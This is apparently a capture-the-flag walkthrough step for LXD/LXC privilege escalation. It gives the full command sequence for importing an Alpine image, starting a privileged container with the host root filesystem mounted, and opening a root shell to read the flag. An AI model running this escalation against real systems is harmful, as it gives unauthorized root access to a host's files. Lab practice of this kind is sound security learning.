first , upload the "alpine-v3.13-x86_64-20210116_1421.tar.gz" to the victim machine vie netcat or whatever 

then , lxc image import ./alpine-v3.13-x86_64-20210116_1421.tar.gz --alias myimage 
to import the image


Now that the image has been imported run the following commands to obtain a root shell in the image mount point:

lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

As we are inside a container we need to cd over to /mnt/root to see the local machine files. use the following command cd /mnt/root/root  

From here we can grab the root flag and submit it.
